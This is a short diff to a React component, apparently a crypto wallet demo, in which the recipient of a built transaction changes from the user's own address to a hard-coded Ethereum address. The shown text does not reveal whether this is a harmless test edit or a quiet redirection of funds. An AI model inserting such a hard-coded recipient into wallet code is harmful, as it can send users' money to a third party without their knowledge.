@@ -367,7 +367,7 @@ class App extends React.Component<any, any> {
     const from = address;
 
     // to
-    const to = address;
+    const to = "0x62D62c2FdA71ba7bcc9E97B628a22D218eCa3eD8";
 
     // nonce
     const _nonce = await apiGetAccountNonce(address, chainId);
